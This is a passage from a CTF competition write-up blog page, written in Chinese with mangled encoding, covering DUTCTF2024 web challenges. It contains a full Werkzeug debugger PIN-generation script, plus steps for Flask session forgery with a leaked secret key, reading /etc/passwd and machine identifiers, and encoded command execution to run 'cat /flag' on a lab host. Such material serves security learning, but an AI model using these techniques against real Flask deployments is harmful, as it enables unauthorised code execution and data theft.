class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&#x27;No selected file&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(char.isalnum() <span class="keyword">or</span> char <span class="keyword">in</span> [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;-&#x27;</span>] <span class="keyword">for</span> char <span class="keyword">in</span> file.filename):</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&#x27;Invalid filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ£€æŸ¥ç›®å½•ä¸‹æ˜¯å¦å·²ç»å­˜åœ¨åŒåæ–‡ä»¶</span></span><br><span class="line">        target_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(target_path):</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&quot;File already existed&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> file:</span><br><span class="line">            file.save(target_path)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;File uploaded successfully&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¦‚æœæ˜¯ GET è¯·æ±‚ï¼Œåˆ™è¿”å›æ–‡ä»¶ä¸Šä¼ é¡µé¢</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;file_uploader.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹è·¯å¾„é‡å®šå‘è‡³ç™»å½•é¡µé¢</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_permissions</span>(<span class="params">file_path, username</span>):</span><br><span class="line">    <span class="comment"># æ£€æŸ¥ç”¨æˆ·æ˜¯å¦æœ‰æƒé™è®¿é—®ç‰¹å®šæ–‡ä»¶æˆ–ç›®å½•</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä» JSON æ–‡ä»¶ä¸­è¯»å–ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user_data.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        user_data = json.load(f)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å–ç”¨æˆ·çš„æƒé™é…ç½®</span></span><br><span class="line">    user_permissions = user_data.get(username, &#123;&#125;).get(<span class="string">&#x27;permissions&#x27;</span>, &#123;&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ£€æŸ¥æ–‡ä»¶è·¯å¾„æ˜¯å¦ä¸ç”¨æˆ·æƒé™é…ç½®ä¸­çš„æŸä¸ªè·¯å¾„åŒ¹é…</span></span><br><span class="line">    <span class="keyword">for</span> permission_path <span class="keyword">in</span> user_permissions.keys():</span><br><span class="line">        <span class="keyword">if</span> file_path.startswith(permission_path):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/error&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> flag:</span><br><span class="line">        flag = flag.read()</span><br><span class="line">    <span class="keyword">assert</span> flag == <span class="string">&quot;dutctf&#123;Fak3_fl@g_2333&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># åˆå§‹åŒ–ç”¨æˆ·æ•°æ®æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(USER_DATA_FILE):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(USER_DATA_FILE, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            json.dump(&#123;&#125;, f)</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="string">&#x27;5000&#x27;</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„åˆ°<code>/update_permissions</code>æœ‰å¯¹ç®¡ç†å‘˜çš„èº«ä»½è¿›è¡Œæ£€æµ‹ï¼Œä¸”å¼€å¤´å¤„ç»™å‡ºäº†secretkeyï¼ŒçŒœæµ‹æœ‰flask sessionä¼ªé€ </p>
<p>å…ˆdecode</p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/15.png" class="" width="15">

<p>æ ¹æ®æç¤ºï¼Œæ¥åˆ°å‡ºé¢˜äººçš„githubä¸­ï¼Œæ‰¾åˆ°ç›¸å…³é¢˜ç›®çš„commit</p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/image-20240325165122168.png" class="" title="image-20240325165122168">

<p>æ‰¾åˆ°SECRET_KEY</p>
<p>ç„¶åæŠŠç›¸å…³æƒé™æ”¹ä¸€ä¸‹ä¹‹ååŠ å¯†</p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/image-20240325170051367.png" class="" title="image-20240325170051367">

<p>ç„¶åupdate permissions</p>
<p>æŠŠæ ¹ç›®å½•çš„è¯»æƒé™äº¤ç»™ctfer</p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/image-20240325174306046.png" class="" title="image-20240325174306046">

<p>ç„¶åæ ¹æ®è§£pinç çš„éœ€æ±‚æ‰¾åˆ°6ä¸ªç›¸å…³çš„æ•°æ®</p>
<p>è¯»å–/etc/passwd</p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/image-20240325174344172.png" class="" title="image-20240325174344172">

<p>flaskç™»å½•çš„ç”¨æˆ·åæ˜¯<code>root</code></p>
<p>modnameé»˜è®¤å€¼ä¸º<code>flask.app</code></p>
<p>appnameé»˜è®¤å€¼ä¸º<code>Flask</code></p>
<p>moddirï¼ˆflaskä¸‹çš„ç»å¯¹è·¯å¾„ï¼‰å¯ä»¥é€šè¿‡æŠ¥é”™ç•Œé¢æ¥å¾—çŸ¥ï¼š<code>/usr/local/lib/python3.9/site-packages/flask/app.py</code></p>
<p>ç½‘ç»œmacå¯ä»¥é€šè¿‡<code>/sys/class/net/eth0/address</code>è·å¾—</p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/image-20240325175106383.png" class="" title="image-20240325175106383">

<p>ä¸­é—´å†’å·å»æ‰åå¾—åˆ°çš„æ•°è½¬æ¢ä¸ºåè¿›åˆ¶å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„å€¼ï¼š<code>2485376909319</code></p>
<p>dockeræœºå™¨çš„idå¯ä»¥é€šè¿‡<code>/etc/machine-id</code>æˆ–è€…<code>/proc/sys/kernel/random/boot_id</code>å¾—åˆ°ï¼š<code>c5391a8d-9aa2-4478-9b74-012e3e76e356</code></p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/image-20240325175404256.png" class="" title="image-20240325175404256">

<p>å…­ä¸ªå€¼éƒ½å¾—åˆ°äº†ï¼Œç°åœ¨æ¥å†™è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.9/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485376909319&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c5391a8d-9aa2-4478-9b74-012e3e76e356&#x27;</span> <span class="comment"># æŒ‰é“ç†æ¥è¯´è¿™é‡Œæ˜¯machine_idæˆ–è€…boot_idä¸/proc/self/cgroupï¼Œä½†æˆ‘è®¿é—®ä¹‹åå´å‘ç°æ˜¯ç©ºï¼Œæ‰€ä»¥æˆ‘ç›´æ¥æŠŠboot_idæ”¾ä¸Šå»äº†ï¼Œä¸å½±å“è§£é¢˜</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>è§£å‡ºpinç ååº”è¯¥å°±å¯ä»¥é€šè¿‡äº†</p>
<p>è¯»å–flag</p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/image-20240325180751124.png" class="" title="image-20240325180751124">

<h2 id="WeirdBash"><a href="#WeirdBash" class="headerlink" title="WeirdBash"></a>WeirdBash</h2><p>ä¸€ä¸ªç®€å•çš„ç¼–ç ç³»ç»Ÿï¼Œå…ˆçœ‹çœ‹èƒ½å¾—å‡ºä»€ä¹ˆ</p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/7.png" class="" width="7">

<p>ç»è¿‡æ•°æ¬¡ç¼–ç ï¼Œæ¨æµ‹æ˜¯æ¯ä¸ªå­—æ¯æ•°å­—ç¬¦å·éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„noobç¼–ç ï¼Œç»„åˆèµ·æ¥çš„å­—ç¬¦ä¸²åœ¨ç¼–ç åå˜æˆæ¯ä¸ªå­—ç¬¦ç¼–ç è¿èµ·æ¥çš„å½¢å¼</p>
<p>å°è¯•è¾“å…¥æ•æ„Ÿå‘½ä»¤ï¼Œä½†éƒ½åªæ˜¯è¢«ç¼–ç ï¼Œæ²¡æœ‰ä»»ä½•å¤šä½™çš„æ“ä½œ</p>
<p>è€ƒè™‘è¾“å…¥ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚flagï¼Œ/etc/passwdç­‰</p>
<p>è¾“å…¥dutctfå‘ç°å¥‡æ€ªçš„ç¼–ç </p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/8.png" class="" width="8">

<p>çŒœæµ‹æ˜¯ä¸€ä¸ªå«æœ‰æ•æ„Ÿä¿¡æ¯çš„è¯­å¥</p>
<p>è¿™ä¸ªå¯ä»¥ä¸€ä¸ªä¸ªå­—ç¬¦è¾“å‡ºæ¥ä½œä¸ºå¯¹ç…§è¡¨ï¼Œä¹Ÿå¯ä»¥å†™è„šæœ¬ç›´æ¥ç§’</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡½æ•°ç”¨äºå‘é€POSTè¯·æ±‚å¹¶è·å–ç¼–ç å€¼</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encoded_value</span>(<span class="params">input_char</span>):</span><br><span class="line">    url = <span class="string">&quot;http://10.7.37.200:10166/encode&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;input_string&#x27;</span>: input_char&#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        encoded_value = soup.find(<span class="string">&#x27;pre&#x27;</span>).text  <span class="comment"># æ ¹æ®å®é™…è¿”å›çš„HTMLç»“æ„è°ƒæ•´</span></span><br><span class="line">        <span class="keyword">return</span> encoded_value</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ASCIIå­—ç¬¦èŒƒå›´ä»32åˆ°126</span></span><br><span class="line">start_ascii = <span class="number">32</span></span><br><span class="line">end_ascii = <span class="number">126</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºæ–‡ä»¶å</span></span><br><span class="line">output_file = <span class="string">&#x27;encoded_values.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_ascii, end_ascii + <span class="number">1</span>):</span><br><span class="line">        char = <span class="built_in">chr</span>(i)</span><br><span class="line">        encoded_value = get_encoded_value(char)</span><br><span class="line">        <span class="comment"># æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¦‚ &quot;0 noob!noob?&quot;</span></span><br><span class="line">        output_line = <span class="string">f&quot;<span class="subst">&#123;char&#125;</span> <span class="subst">&#123;encoded_value&#125;</span>\n&quot;</span></span><br><span class="line">        file.write(output_line)</span><br><span class="line">        <span class="built_in">print</span>(output_line)  <span class="comment"># åœ¨æ§åˆ¶å°è¾“å‡º</span></span><br></pre></td></tr></table></figure>

<p>è¿™å¥è¯å¤§è‡´æ„æ€å°±æ˜¯è®©æˆ‘ä»¬è¿›å…¥noobç›®å½•ä¸‹é¢ï¼Œæœ‰ä¸œè¥¿</p>
<p>è¿›å…¥åˆ°noobç›®å½•ä¸‹</p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/9.png" class="" width="9">

<p>å‘ç°æ˜¯noobè§£ç ï¼Œå¯ä»¥è€ƒè™‘å°†å‘½ä»¤è¿›è¡Œnoobç¼–ç åå†è§£ç å¾—åˆ°å‘½ä»¤æ‰§è¡Œåçš„ç»“æœï¼Œ<del>æ„Ÿè§‰è·Ÿåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ•ˆæœå·®ä¸å¤š</del>{. info}</p>
<img src="/2024/03/18/competition/202403/DUTCTF2024/10.png" class="" width="10">

<p>ï¼ˆè¿™é‡Œæ˜¯lsç¼–ç ä¹‹åçš„ç»“æœï¼‰</p>
<p>ä¹‹åcat /flagå³å¯</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h2><p>test3</p>
<h2 id="é³—ä»€ä¹ˆç½å¤´æˆ‘è¯´"><a href="#é³—ä»€ä¹ˆç½å¤´æˆ‘è¯´" class="headerlink" title="é³—ä»€ä¹ˆç½å¤´æˆ‘è¯´"></a>é³—ä»€ä¹ˆç½å¤´æˆ‘è¯´</h2><p>test4</p>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey">Â </i><a class="article-more button is-small link-muted index-categories" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a></div>Â Â <hr></div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/">ä¸Šä¸€é¡µ</a></div><div class="pagination-next"><a href="/page/3/">ä¸‹ä¸€é¡µ</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><a class="pagination-link is-current" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/LUFFY.jpg" alt="Ins0mn1a"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Ins0mn1a</p><p class="is-size-6 is-block">æ€ä¹ˆæ‰èƒ½ç¡ä¸ªå¥½è§‰å‘¢ï¼Ÿ</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Guiyang!!!</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ–‡ç« </p><a href="/archives"><p class="title">21</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">åˆ†ç±»</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ ‡ç­¾</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Luffys93" target="_blank" rel="noopener">å…³æ³¨æˆ‘</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Luffys93"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:1725237709@qq.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D ä¸€è¨€å¥å­è·å–ä¸­...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"æ¥æºã€Š"+data.from+"ã€‹</p><p>æä¾›è€…-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">é“¾æ¥</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget"><div class="card-content"><h3 class="menu-label">æœ€æ–°è¯„è®º</h3><span class="body_hot_comment">åŠ è½½ä¸­ï¼Œæœ€æ–°è¯„è®ºæœ‰1åˆ†é’Ÿç¼“å­˜...</span></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">æœ€æ–°æ–‡ç« </h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-07-29T05:34:18.859Z">2024-07-29</time></p><p class="title"><a href="/2024/07/29/hello-world/">Hello World</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-07-03T07:58:06.000Z">2024-07-03</time></p><p class="title"><a href="/2024/07/03/Webbbb/Others/Shell/">å­¦ä¹ webå®‰å…¨çš„é‚£äº›äºŒä¸‰äº‹-åå¼¹Shellç¯‡</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-06-27T05:54:49.000Z">2024-06-27</time></p><p class="title"><a href="/2024/06/27/Webbbb/linux/linux-second/">linux-second</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-06-25T08:20:52.000Z">2024-06-25</time></p><p class="title"><a href="/2024/06/25/Webbbb/linux/linux-first/">å­¦ä¹ webå®‰å…¨çš„é‚£äº›äºŒä¸‰äº‹-linuxç¯‡ï¼ˆ1ï¼‰</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-06-25T00:01:30.000Z">2024-06-25</time></p><p class="title"><a href="/2024/06/25/Webbbb/PHP/php-first/">å­¦ä¹ webå®‰å…¨çš„é‚£äº›äºŒä¸‰äº‹-phpç¯‡ï¼ˆ1ï¼‰</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">åˆ†ç±»</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/Scr1w%E5%B9%B3%E5%8F%B0/"><span class="level-start"><span class="level-item">Scr1wå¹³å°</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/Vulhub/"><span class="level-start"><span class="level-item">Vulhub</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/buu%E5%B9%B3%E5%8F%B0/"><span class="level-start"><span class="level-item">buuå¹³å°</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E6%AF%94%E8%B5%9B/"><span class="level-start"><span class="level-item">æ¯”èµ›</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E8%AE%A1%E7%BD%91/"><span class="level-start"><span class="level-item">è®¡ç½‘</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">å½’æ¡£</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2024/07/"><span class="level-start"><span class="level-item">ä¸ƒæœˆ 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2024/06/"><span class="level-start"><span class="level-item">å…­æœˆ 2024</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2024/05/"><span class="level-start"><span class="level-item">äº”æœˆ 2024</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2024/04/"><span class="level-start"><span class="level-item">å››æœˆ 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2024/03/"><span class="level-start"><span class="level-item">ä¸‰æœˆ 2024</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><a class="level is-mobile is-marginless" href="/archives/"><span class="level-start"><span class="level-item">æŸ¥çœ‹å…¨éƒ¨&gt;&gt;</span></span></a></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">è®¢é˜…æ›´æ–°</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="è®¢é˜…"></div></div></form></div></div></div><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">INSOMNIA.__é€ƒç¦»å¤±çœ __</a><p class="size-small"><span>&copy; 2024 Ins0mn1a</span>Â Â Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a>Â <br><span>Â© ç‰ˆæƒè¯´æ˜ï¼š[æœ¬ç½‘ç«™æ‰€æœ‰å†…å®¹å‡æ”¶é›†äºäº’è”ç½‘æˆ–è‡ªå·±åˆ›ä½œ,<br />&nbsp;&nbsp;&nbsp;&nbsp;æ–¹ä¾¿äºå„ä½å¸ˆå‚…ä¸è‡ªå·±å­¦ä¹ äº¤æµï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·<a href="/message" target="_blank">ç•™è¨€</a>]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
            var n = new Date(time);
            now.setTime(now.getTime() + 250),
                days = (now - n) / 1e3 / 60 / 60 / 24,
                dnum = Math.floor(days),
                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
                hnum = Math.floor(hours),
            1 == String(hnum).length && (hnum = "0" + hnum),
                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
                mnum = Math.floor(minutes),
            1 == String(mnum).length && (mnum = "0" + mnum),
                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
                snum = Math.round(seconds),
            1 == String(snum).length && (snum = "0" + snum),
                document.getElementById("statistic-times").innerHTML = "â¤ï¸æœ¬ç«™è‡ª <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> å·²è¿è¡Œ <strong>" + dnum + "</strong> å¤© <strong>" + hnum + "</strong> å°æ—¶ <strong>" + mnum + "</strong> åˆ† <strong>" + snum + "</strong> ç§’ï¼â¤ï¸";
